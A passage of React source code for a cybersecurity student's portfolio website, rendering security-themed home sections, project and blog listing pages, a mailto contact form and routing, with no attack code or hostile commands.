              title="Click to toggle Ambient Cyber Focus Synth (Web Audio API)"
            >
              <div className={`soundwave-container ${isAmbient ? "is-playing" : ""}`}>
                <div className="bar" />
                <div className="bar" />
                <div className="bar" />
                <div className="bar" />
              </div>
              <span className="status-badge-text">
                {isAmbient
                  ? "🎵 Ambient Focus Synth Active • Click to mute"
                  : "🎧 Listening to Spotify // Ambient Focus • Summer 2026 Ready ⚡"}
              </span>
            </div>

            <h1>
              Hi, I’m <ScrambleText text="Nihar Ranjan Mohapatra" className="highlight" /> 👋
            </h1>
            <p className="hero-role">
              🛡️ Computer Science Engineer & Cyber Security Specialist <span>/</span> 💻 Full-Stack Developer
            </p>
            <p className="hero-summary">
              Undergraduate scholar at Gandhi Engineering College (GEC Autonomous College) and Trainee System Engineer Intern at Cyfen Labs. I build defensive security tools, analyze raw network packet flows, engineer <span className="highlight">zero-knowledge</span> cryptographic lockers, and develop resilient web applications.
            </p>
            <div className="hero-actions">
              <Link to="/projects" className="button button-primary">
                Explore Deployments 🚀 <ArrowRight size={16} weight="bold" />
              </Link>
              <a href="/resume.pdf" download className="button button-outline">
                Download Resume 📄 <ArrowDownRight size={15} />
              </a>
            </div>
            <div className="hero-focus">
              {[
                "🛡️ Cyber Security Specialist",
                "💻 Computer Science Engineer",
                "⚡ Ethical Defense & Scapy",
                "🚀 Full-Stack Developer",
              ].map((item) => (
                <span key={item}>{item}</span>
              ))}
            </div>
          </Reveal>
        </div>
        <Reveal className="hero-visual" delay={0.1}>
          <div className="hero-avatar-frame">
            <img
              src="/nihar-profile.jpg"
              alt="Nihar Ranjan Mohapatra portrait"
              fetchPriority="high"
            />
            <div className="scanner-sweep" />
            <div className="hero-image-wash" />
            <div className="hero-caption">
              <span className="caption-mark">NRM</span>
              <span>
                <strong>Nihar Ranjan Mohapatra</strong>
                <small>Bhubaneswar, Odisha • 20.2961° N</small>
              </span>
              <ShieldCheck size={18} weight="fill" />
            </div>
          </div>
          <div className="floating-note note-top">
            <Shield size={17} weight="fill" style={{ color: "#1dd05d" }} />
            <span>
              Defense Posture<br />
              <small style={{ color: "var(--other-para-color)", fontSize: "9px" }}>Perimeter: Active</small>
            </span>
          </div>
          <div className="floating-note note-bottom">
            <span className="note-swatch" style={{ background: "var(--accent-blue)" }} />
            <span>
              Cyfen Labs Intern<br />
              <small style={{ color: "var(--other-para-color)", fontSize: "9px" }}>Trainee System Eng.</small>
            </span>
          </div>
          <div className="hero-orbit" aria-hidden="true">
            CYBER<br />DEFENSE
          </div>
        </Reveal>
      </section>

      {/* Intro & Telemetry Strip */}
      <section className="intro-strip" id="about">
        <div className="container intro-strip-inner">
          <p>“Security is not an afterthought—it is the foundational architecture upon which the digital future must be built.”</p>
          <span>
            GEC Autonomous College • 8.6 CGPA <i /> Bhubaneswar, Odisha, India
          </span>
        </div>
      </section>

      {/* Live Telemetry Strip */}
      <section className="container" style={{ paddingTop: "14px" }}>
        <TelemetryHub soundEnabled={soundEnabled} />
      </section>

      {/* Engineering Dossier & Metrics */}
      <section className="section container" id="dossier">
        <SectionTitle
          title="📊 Engineering Dossier"
          text="Curiosity about how complex computer systems communicate under the hood—and where their subtle vulnerabilities reside."
        />
        <div className="timeline-content" style={{ marginTop: "12px", padding: "28px" }}>
          <p style={{ margin: 0, fontSize: "14px", lineHeight: 1.85, color: "var(--para-gray-color)" }}>
            Hello! I'm <strong>Nihar Ranjan Mohapatra</strong>, a dedicated Computer Science Engineering scholar with an intense passion for <span className="highlight">Cyber Security</span>, <span className="highlight">Ethical Hacking</span>, systems programming, and modern software development based in Bhubaneswar, Odisha, India. My engineering path is fueled by curiosity about how complex operating systems communicate under the hood—and where their subtle vulnerabilities reside.
          </p>
          <p style={{ margin: "16px 0 0", fontSize: "14px", lineHeight: 1.85, color: "var(--para-gray-color)" }}>
            Whether analyzing raw network packets in Wireshark, constructing BPF filters in Scapy, dissecting binary exploit flows, building automated security tools with Python, or crafting responsive, hardened web interfaces, I approach engineering with a dual perspective: <em>understanding the adversary to engineer unbreachable defensive systems.</em>
          </p>
          <div className="metrics-grid">
            {metrics.map((m) => (
              <div key={m.title} className="metric-box">
                <div className="metric-num">{m.num}</div>
                <div className="metric-title">{m.title}</div>
                <div className="metric-desc">{m.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Live Threat Defense Radar */}
      <section className="section experience-section" id="radar">
        <div className="container">
          <SectionTitle
            title="🌐 Real-Time Network Defense Radar"
            text="Simulated live ICMP ping telemetry monitoring DNS resolvers and defensive perimeter nodes."
          />
          <DefenseRadar />
        </div>
      </section>

      {/* Live BPF Packet Capture Stream (SentinelGuard Engine) */}
      <section className="section container" id="packet-stream">
        <SectionTitle
          title="📡 Live BPF Packet Triage Stream"
          text="Simulated real-time promiscuous socket packet inspection engine modeled after SentinelGuard's Scapy / C++ architecture."
        />
        <PacketStream soundEnabled={soundEnabled} />
      </section>

      {/* Featured Projects Vault (3 Columns) */}
      <section className="section container work-section" id="work">
        <SectionTitle
          title="🚀 Featured Deployments"
          text="Real-world security tools, network monitors, cryptographic utilities, and web portals built with precision."
          action={
            <Link className="text-link section-action" to="/projects">
              View all 6 deployments <ArrowRight size={15} />
            </Link>
          }
        />
        <div className="project-grid">
          <ProjectCard project={projects[0]} index={0} featured />
          <ProjectCard project={projects[1]} index={1} />
          <ProjectCard project={projects[2]} index={2} />
        </div>
      </section>

      {/* Security Advisories & CVE Research (New Component) */}
      <section className="section experience-section" id="advisories">
        <div className="container">
          <SectionTitle
            title="🚨 Security Advisories & Research"
            text="Original vulnerability research, attack vector threat modeling, and responsible disclosure advisories."
          />
          <div className="cve-grid">
            {securityAdvisories.map((cve, idx) => (
              <Reveal key={cve.id} className="cve-card" delay={idx * 0.08}>
                <div className="cve-badge-row">
                  <span className="cve-id">{cve.id}</span>
                  <span className={`cve-cvss cvss-${cve.cvssType}`}>{cve.cvss}</span>
                </div>
                <h3>{cve.title}</h3>
                <p className="cve-vector"><strong>Target:</strong> {cve.target} • {cve.vector}</p>
                <p className="cve-desc">{cve.description}</p>
                <div className="cve-remediation">
                  <strong>Defensive Mitigation:</strong> {cve.mitigation}
                </div>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* Hardware & Equipment Arsenal (Dedicated Component) */}
      <EquipmentSection soundEnabled={soundEnabled} />

      {/* Technical Skills Arsenal */}
      <section className="section experience-section" id="skills">
        <div className="container">
          <SectionTitle
            title="⚡ Technical Skills Arsenal"
            text="Core competencies across programming languages, security frameworks, operating environments, and systems engineering."
            action={
              <div className="filter-row">
                {["All", "Cyber Security", "Languages & Systems", "Web & Frontend"].map((cat) => (
                  <button
                    key={cat}
                    type="button"
                    className={`filter-pill ${skillCategory === cat ? "selected" : ""}`}
                    onClick={() => {
                      playSound("click", soundEnabled);
                      setSkillCategory(cat);
                    }}
                  >
                    {cat}
                  </button>
                ))}
              </div>
            }
          />
          <div className="skills-grid">
            {filteredSkillGroups.map(({ title, icon: Icon, items }, index) => (
              <Reveal className="skill-group" key={title} delay={index * 0.08}>
                <div className="skill-heading">
                  <span className="skill-icon">
                    <Icon size={19} weight="regular" />
                  </span>
                  <h3>{title}</h3>
                </div>
                <div style={{ display: "grid", gap: "14px", marginTop: "18px" }}>
                  {items.map((item) => (
                    <div key={item.name} style={{ display: "grid", gap: "5px" }}>
                      <div style={{ display: "flex", justifyContent: "space-between", fontSize: "12px", fontWeight: 700 }}>
                        <span>{item.name}</span>
                        <span style={{ fontFamily: "monospace", color: "var(--accent-blue)" }}>{item.level}%</span>
                      </div>
                      <div style={{ height: "6px", borderRadius: "999px", background: "var(--soft-line)", overflow: "hidden" }}>
                        <div
                          style={{
                            height: "100%",
                            width: `${item.level}%`,
                            borderRadius: "999px",
                            background: "var(--accent-blue)",
                          }}
                        />
                      </div>
                      <span style={{ fontSize: "11px", color: "var(--other-para-color)" }}>{item.note}</span>
                    </div>
                  ))}
                </div>
              </Reveal>
            ))}
          </div>
        </div>
      </section>

      {/* Interactive Cyber Security Testing Suite */}
      <section className="section container" id="security-tests">
        <SectionTitle
          title="🧪 Interactive Security Testing Suite"
          text="Run real-time penetration tests, inspect WAF injection defenses, audit HTTP security headers, and simulate port vulnerability scans."
        />
        <SecurityTestingSuite soundEnabled={soundEnabled} />
      </section>

      {/* Interactive Cryptographic Security Lab */}
      <section className="section container" id="entropy-lab">
        <SectionTitle
          title="🛡️ Password Resilience & Entropy Lab"
          text="Live Shannon entropy analyzer calculating search space complexity and offline GPU brute-force resistance."
        />
        <EntropyLab soundEnabled={soundEnabled} />
      </section>

      {/* Interactive CTF Cipher Challenge Mini-Game */}
      <section className="section experience-section" id="ctf">
        <div className="container">
          <SectionTitle
            title="🔐 Interactive CTF Challenge"
            text="Test cryptographic decoding in real-time right from your browser."
          />
          <CtfChallenge soundEnabled={soundEnabled} />
        </div>
      </section>

      {/* Experience & Practical Training */}
      <section className="section container" id="experience">
        <SectionTitle
          title="💼 Experience & Practical Training"
          text="Real-time engineering practice from corporate internships to open-source systems."
        />
        <div className="timeline">
          {experience.map((exp, index) => (
            <Reveal className="timeline-item" key={exp.role} delay={index * 0.09}>
              <span className="timeline-marker" />
              <div className="timeline-date">{exp.date}</div>
              <div className="timeline-content">
                <div className="timeline-heading">
                  <div>
                    <h3>{exp.role}</h3>
                    <p>{exp.company} • <span>{exp.place}</span></p>
                  </div>
                  <span className="timeline-chip">{exp.chip}</span>
                </div>
                <ul>
                  {exp.details.map((detail, idx) => (
                    <li key={idx}>{detail}</li>
                  ))}
                </ul>
              </div>
            </Reveal>
          ))}
        </div>
      </section>

      {/* Education & Certifications */}
      <section className="section experience-section" id="education">
        <div className="container">
          <SectionTitle
            title="🎓 Education & Certifications"
            text="Formal engineering background, cybersecurity specializations, and professional technical qualifications."
          />
          <div className="academics-wrap">
            {educationData.map((edu, idx) => (
              <Reveal key={edu.degree} className="academic-card" delay={idx * 0.08}>
                <span className="academic-badge">
                  <GraduationCap size={15} weight="bold" /> {edu.status}
                </span>
                <h3>{edu.degree}</h3>
                <p className="academic-institution">{edu.spec} — {edu.institution}</p>
                <p>{edu.location}</p>
                <p style={{ marginTop: "4px" }}>{edu.description}</p>
              </Reveal>
            ))}
          </div>

          <div className="certs-grid">
            {certifications.map((cert, idx) => {
              const Icon = cert.icon;
              return (
                <Reveal key={cert.title} className="cert-card" delay={idx * 0.06}>
                  <div className="cert-icon">
                    <Icon size={19} weight="regular" />
                  </div>
                  <div className="cert-info">
                    <h4>{cert.title}</h4>
                    <p style={{ fontWeight: 600, color: "var(--accent-blue)" }}>{cert.issuer}</p>
                    <p>{cert.desc}</p>
                  </div>
                </Reveal>
              );
            })}
          </div>
        </div>
      </section>

      {/* Personal Interests Spectrum */}
      <section className="section container" id="interests">
        <SectionTitle
          title="🌈 Personal Interests Spectrum"
          text="The multidimensional passions that inspire my technical creativity, discipline, and worldview."
        />
        <div className="interests-grid">
          {personalInterests.map((interest, idx) => {
            const Icon = interest.icon;
            return (
              <Reveal key={interest.title} className="interest-card" delay={idx * 0.08}>
                <span className="interest-num">{interest.number} // SPECTRUM</span>
                <div className="interest-icon-wrap">
                  <Icon size={20} weight="regular" />
                </div>
                <h3>{interest.title}</h3>
                <p>{interest.text}</p>
                <div className="interest-tags">
                  {interest.tags.map((t) => (
                    <span className="tag" key={t}>{t}</span>
                  ))}
                </div>
              </Reveal>
            );
          })}
        </div>
      </section>

      {/* Interactive Developer CLI Terminal */}
      <section className="section experience-section terminal-section" id="terminal">
        <div className="container">
          <SectionTitle
            title="💻 Interactive Terminal Console"
            text="Simulate a real-time developer terminal: execute commands to inspect my background, toolchain, and projects."
          />
          <CliTerminal soundEnabled={soundEnabled} />
        </div>
      </section>

      {/* Research & Technical Notes */}
      <section className="section container blog-preview">
        <SectionTitle
          title="📝 Research & Engineering Notes"
          text="Deep dives into packet analysis, zero-knowledge encryption, attack surfaces, and systems programming."
          action={
            <Link className="text-link section-action" to="/blogs">
              All 4 articles <ArrowRight size={15} />
            </Link>
          }
        />
        <div className="blog-preview-grid">
          {articles.slice(0, 3).map((article, index) => (
            <ArticleCard key={article.slug} article={article} index={index} />
          ))}
        </div>
      </section>

      <CollaborationBanner />
    </>
  );
}

function CollaborationBanner() {
  return (
    <section className="collab-wrap container">
      <div className="collab-banner">
        <div className="collab-copy">
          <span className="collab-kicker">Have a challenging technical problem?</span>
          <h2>Let’s engineer secure, resilient digital systems together.</h2>
          <p>Open for Cyber Security & Software Engineering roles, Summer 2026 internships, and collaborative research.</p>
        </div>
        <Link className="button button-light" to="/contact">
          Transmit a message <ArrowUpRight size={16} />
        </Link>
        <span className="collab-mark" aria-hidden="true">N</span>
      </div>
    </section>
  );
}

function ArticleCard({ article, index = 0 }) {
  return (
    <Reveal className="article-card" delay={index * 0.07}>
      <Link className="article-image" to={`/blogs/${article.slug}`}>
        <img src={image(article.image)} alt="" loading="lazy" />
        <span className="article-category">{article.category}</span>
      </Link>
      <div className="article-info">
        <div className="article-meta">
          <span>{article.date}</span>
          <span>{article.read}</span>
        </div>
        <h3>
          <Link to={`/blogs/${article.slug}`}>{article.title}</Link>
        </h3>
        <p>{article.excerpt}</p>
        <Link className="text-link" to={`/blogs/${article.slug}`}>
          Read full analysis <ArrowRight size={15} />
        </Link>
      </div>
    </Reveal>
  );
}

function PageIntro({ label, title, text }) {
  return (
    <div className="page-intro container">
      <Reveal>
        <p className="page-kicker">{label}</p>
        <h1>{title}</h1>
        <p className="page-lede">{text}</p>
      </Reveal>
    </div>
  );
}

function ProjectsPage() {
  const [filter, setFilter] = useState("All");
  const categories = ["All", "Network & Forensics", "Cryptography & Systems", "Cyber Security", "Web & Full Stack"];
  const shown = filter === "All" ? projects : projects.filter((project) => project.category === filter);

  return (
    <>
      <PageIntro
        label="Engineering Deployments"
        title={
          <>
            Projects engineered for<br /><span className="highlight">defense, security</span> & scale.
          </>
        }
        text="A curated vault of intrusion detection systems, cryptographic lockers, port scanners, and modern web portals."
      />
      <section className="container page-content projects-page-content">
        <div className="filter-row" role="group" aria-label="Filter case studies">
          {categories.map((category) => (
            <button
              type="button"
              className={`filter-pill ${filter === category ? "selected" : ""}`}
              key={category}
              onClick={() => setFilter(category)}
            >
              {category}
            </button>
          ))}
        </div>
        <div className="project-grid project-grid-full" aria-live="polite">
          <AnimatePresence mode="popLayout">
            {shown.map((project, index) => (
              <ProjectCard key={project.slug} project={project} index={index} />
            ))}
          </AnimatePresence>
        </div>
        <div className="project-note">
          <span>Verified Engineering Standards.</span>
          <p>
            All security tools and repositories implement defense-in-depth principles, memory safety, and responsible disclosure practices.
          </p>
        </div>
      </section>
    </>
  );
}

function ProjectDetailPage() {
  const { slug } = useParams();
  const project = projects.find((item) => item.slug === slug);
  if (!project) return <NotFoundPage />;

  return (
    <>
      <section className="detail-hero container">
        <Link className="back-link" to="/projects">
          <ArrowLeft size={15} /> All Deployments
        </Link>
        <Reveal>
          <div className="project-meta detail-meta">
            <span>{project.category}</span>
            <span>{project.year}</span>
          </div>
          <h1>{project.title}</h1>
          <p className="detail-subtitle">{project.subtitle}</p>
          <div className="detail-tags">
            {project.tags.map((tag) => (
              <span className="tag" key={tag}>{tag}</span>
            ))}
          </div>
        </Reveal>
        <Reveal className="detail-cover" delay={0.08}>
          <img src={image(project.image, 1800)} alt={`${project.title} cover`} />
        </Reveal>
      </section>
      <section className="container detail-body">
        <div className="detail-facts">
          <span>Role</span>
          <strong>{project.role}</strong>
          <span>Timeline</span>
          <strong>{project.year}</strong>
          <span>Category</span>
          <strong>{project.category}</strong>
          <span>Source Code</span>
          <strong>
            <a href={project.github} target="_blank" rel="noreferrer" style={{ color: "var(--accent-blue)" }}>
              GitHub Repo <ArrowUpRight size={13} />
            </a>
          </strong>
        </div>
        <div className="detail-story">
          <Reveal>
            <h2>The Technical Challenge</h2>
            <p>{project.challenge}</p>
          </Reveal>
          <Reveal>
            <h2>Architectural Approach</h2>
            <p>{project.approach}</p>
          </Reveal>
          <Reveal>
            <h2>Engineering Outcome</h2>
            <p>{project.outcome}</p>
          </Reveal>
          <div className="detail-contact">
            <p>Want to inspect source code, benchmarks, or discuss the architecture?</p>
            <Link className="text-link" to="/contact">
              Get in touch <ArrowUpRight size={15} />
            </Link>
          </div>
        </div>
      </section>
    </>
  );
}

function BlogsPage() {
  const [category, setCategory] = useState("All");
  const [query, setQuery] = useState("");
  const categories = ["All", "Network Forensics", "Cryptography", "Cyber Security", "Engineering"];
  const shown = useMemo(
    () =>
      articles.filter((article) => {
        const matchesCategory = category === "All" || article.category === category;
        const matchesQuery = `${article.title} ${article.excerpt} ${article.category}`
          .toLowerCase()
          .includes(query.toLowerCase().trim());
        return matchesCategory && matchesQuery;
      }),
    [category, query]
  );

  return (
    <>
      <PageIntro
        label="Research & Engineering Notes"
        title={
          <>
            Dispatches from the <span className="highlight">frontiers</span><br />of systems & defense.
          </>
        }
        text="Detailed writeups on network packet analysis, zero-knowledge cryptographic lockers, attack surface reconnaissance, and low-level engineering."
      />
      <section className="container page-content blogs-page-content">
        <div className="blog-controls">
          <div className="filter-row" role="group" aria-label="Filter articles">
            {categories.map((item) => (
              <button
                type="button"
                className={`filter-pill ${category === item ? "selected" : ""}`}
                key={item}
                onClick={() => setCategory(item)}
              >
                {item}
              </button>
            ))}
          </div>
          <label className="search-box">
            <MagnifyingGlass size={16} />
            <span className="sr-only">Search articles</span>
            <input
              type="search"
              value={query}
              onChange={(event) => setQuery(event.target.value)}
              placeholder="Search research notes..."
            />
            {query && (
              <button type="button" onClick={() => setQuery("")} aria-label="Clear search">
                <X size={15} />
              </button>
            )}
          </label>
        </div>
        {shown.length > 0 ? (
          <div className="blog-grid" aria-live="polite">
            {shown.map((article, index) => (
              <ArticleCard article={article} index={index} key={article.slug} />
            ))}
          </div>
        ) : (
          <div className="empty-state">
            <MagnifyingGlass size={24} />
            <h2>No articles found</h2>
            <p>Try a different search query or reset your filter.</p>
            <button
              className="text-link"
              type="button"
              onClick={() => {
                setCategory("All");
                setQuery("");
              }}
            >
              Clear filters <ArrowRight size={14} />
            </button>
          </div>
        )}
      </section>
    </>
  );
}

function ArticlePage() {
  const { slug } = useParams();
  const article = articles.find((item) => item.slug === slug);
  if (!article) return <NotFoundPage />;

  return (
    <article className="article-page">
      <div className="container article-detail">
        <Link className="back-link" to="/blogs">
          <ArrowLeft size={15} /> All research notes
        </Link>
        <Reveal>
          <span className="page-kicker">{article.category}</span>
          <h1>{article.title}</h1>
          <div className="article-meta detail-article-meta">
            <span>{article.date}</span>
            <span>{article.read}</span>
          </div>
        </Reveal>
        <Reveal className="article-detail-image">
          <img src={image(article.image, 1600)} alt="" />
        </Reveal>
        <div className="article-body">
          {article.body.map((paragraph, idx) => (
            <p key={idx}>{paragraph}</p>
          ))}
          <Link className="text-link" to="/contact">
            Discuss this research <ArrowRight size={15} />
          </Link>
        </div>
      </div>
    </article>
  );
}

function ContactPage({ soundEnabled }) {
  const [status, setStatus] = useState("");
  const [copied, setCopied] = useState(false);
  const [form, setForm] = useState({
    name: "",
    email: "",
    inquiryType: "Cyber Security & Defensive Research",
    message: "",
  });

  const update = (event) =>
    setForm((current) => ({ ...current, [event.target.name]: event.target.value }));

  const submit = (event) => {
    playSound("click", soundEnabled);
    event.preventDefault();
    const subject = `Transmission: ${form.inquiryType} from ${form.name}`;
    const body = `Name: ${form.name}\nEmail: ${form.email}\nInquiry Type: ${form.inquiryType}\n\nMessage:\n${form.message}`;
    window.location.href = `mailto:nmohapatra079@gmail.com?subject=${encodeURIComponent(
      subject
    )}&body=${encodeURIComponent(body)}`;
    setStatus("Transmission encrypted and ready in your default email client.");
  };

  const handleCopyEmail = () => {
    playSound("click", soundEnabled);
    navigator.clipboard.writeText("nmohapatra079@gmail.com");
    setCopied(true);
    setTimeout(() => setCopied(false), 2200);
  };

  return (
    <>
      <PageIntro
        label="Encrypted Transmission"
        title={
          <>
            Have a project or<br /><span className="highlight">security inquiry?</span>
          </>
        }
        text="Currently open for Cyber Security engineering roles, Summer 2026 internships, open-source collaboration, and technical inquiries."
      />
      <section className="container contact-layout page-content">
        <div className="contact-aside">
          <Reveal>
            <span className="caption-mark" style={{ width: "42px", height: "42px", fontSize: "14px" }}>NRM</span>
            <h2>Let’s connect and engineer the future.</h2>
            <p>
              Undergraduate scholar at Gandhi Engineering College (GEC Autonomous College) & Trainee System Engineer Intern at Cyfen Labs Private Limited.
            </p>
            <div style={{ marginTop: "22px", display: "grid", gap: "10px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                <a className="contact-email" href="mailto:nmohapatra079@gmail.com">
                  nmohapatra079@gmail.com <ArrowUpRight size={15} />
                </a>
                <button
                  type="button"
                  className={`copy-btn ${copied ? "copied" : ""}`}
                  onClick={handleCopyEmail}
                >
                  {copied ? <Check size={12} weight="bold" /> : <Copy size={12} />}
                  {copied ? "Copied" : "Copy"}
                </button>
              </div>
              <p style={{ margin: 0, fontSize: "12px", color: "var(--other-para-color)" }}>
                📍 Bhubaneswar, Odisha, India (IST UTC+5:30)
              </p>
            </div>
            <div className="contact-social-buttons">
              <a
                href="https://github.com/papun-00"
                target="_blank"
                rel="noreferrer"
                className="social-btn social-btn-github"
              >
                <GithubLogo size={16} weight="bold" />
                <span>GitHub (papun-00)</span>
              </a>
              <a
                href="https://x.com/niharranjan00"
                target="_blank"
                rel="noreferrer"
                className="social-btn social-btn-twitter"
              >
                <TwitterLogo size={16} weight="bold" />
                <span>Twitter / X</span>
              </a>
              <a
                href="https://instagram.com/nihar_x622._"
                target="_blank"
                rel="noreferrer"
                className="social-btn social-btn-instagram"
              >
                <InstagramLogo size={16} weight="bold" />
                <span>Instagram</span>
              </a>
            </div>
          </Reveal>
        </div>
        <Reveal className="contact-form-wrap">
          <form className="contact-form" onSubmit={submit}>
            <div className="form-grid">
              <label className="field">
                <span>Your Name</span>
                <input
                  name="name"
                  autoComplete="name"
                  value={form.name}
                  onChange={update}
                  placeholder="e.g. Alex Vance"
                  required
                />
              </label>
              <label className="field">
                <span>Email Address</span>
                <input
                  name="email"
                  type="email"
                  autoComplete="email"
                  value={form.email}
                  onChange={update}
                  placeholder="alex@domain.com"
                  required
                />
              </label>
            </div>
            <label className="field">
              <span>Nature of Inquiry</span>
              <select name="inquiryType" value={form.inquiryType} onChange={update}>
                <option>Cyber Security & Defensive Research</option>
                <option>Summer 2026 Role / Internship Opportunity</option>
                <option>Software Engineering & Full-Stack Development</option>
                <option>Open-Source Collaboration</option>
                <option>General Tech Inquiry</option>
              </select>
            </label>
            <label className="field">
              <span>Message & Transmission Details</span>
              <textarea
                name="message"
                rows={5}
                value={form.message}
                onChange={update}
                placeholder="Share project specifications, system scope, or collaboration details..."
                required
              />
            </label>
            <p className="form-help">
              This initiates a formatted transmission directly addressed to Nihar Ranjan Mohapatra.
            </p>
            {status && (
              <p className="form-status" role="status">
                <Check size={16} /> {status}
              </p>
            )}
            <button className="button button-primary form-submit" type="submit">
              Send Transmission <ArrowRight size={16} />
            </button>
          </form>
        </Reveal>
      </section>
    </>
  );
}

function NotFoundPage() {
  return (
    <section className="container not-found">
      <p className="page-kicker">404 // Node Not Found</p>
      <h1>That terminal endpoint doesn’t exist.</h1>
      <Link className="button button-primary" to="/">
        Return to Root Terminal <ArrowRight size={15} />
      </Link>
    </section>
  );
}

export default function App() {
  const [theme, toggleTheme] = useTheme();
  const [soundEnabled, setSoundEnabled] = useState(false);
  const [isAmbient, setIsAmbient] = useState(false);
  const [showWelcome, setShowWelcome] = useState(() => {
    if (typeof window === "undefined") return false;
    return !sessionStorage.getItem("nrm-booted");
  });

  const handleDismissWelcome = () => {
    setShowWelcome(false);
    sessionStorage.setItem("nrm-booted", "true");
    playSound("success", soundEnabled);
  };

  const toggleSound = () => {
    setSoundEnabled((prev) => {
      const next = !prev;
      if (next) playSound("success", true);
      return next;
    });
  };

  const handleToggleAmbient = () => {
    toggleAmbientFocus((playing) => {
      setIsAmbient(playing);
    });
  };

  return (
    <>
      <AnimatePresence>
        {showWelcome && <WelcomeOverlay onComplete={handleDismissWelcome} />}
      </AnimatePresence>
      <Layout
        theme={theme}
        toggleTheme={toggleTheme}
        soundEnabled={soundEnabled}
        toggleSound={toggleSound}
        isAmbient={isAmbient}
        toggleAmbient={handleToggleAmbient}
      >
        <Routes>
          <Route
            path="/"
            element={
              <HomePage
                soundEnabled={soundEnabled}
                isAmbient={isAmbient}
                toggleAmbient={handleToggleAmbient}
              />
            }
          />
          <Route path="/projects" element={<ProjectsPage />} />
          <Route path="/projects/:slug" element={<ProjectDetailPage />} />
          <Route path="/blogs" element={<BlogsPage />} />
          <Route path="/blogs/:slug" element={<ArticlePage />} />
          <Route path="/contact" element={<ContactPage soundEnabled={soundEnabled} />} />
          <Route path="*" element={<NotFoundPage />} />
        </Routes>
      </Layout>
    </>
  );
}
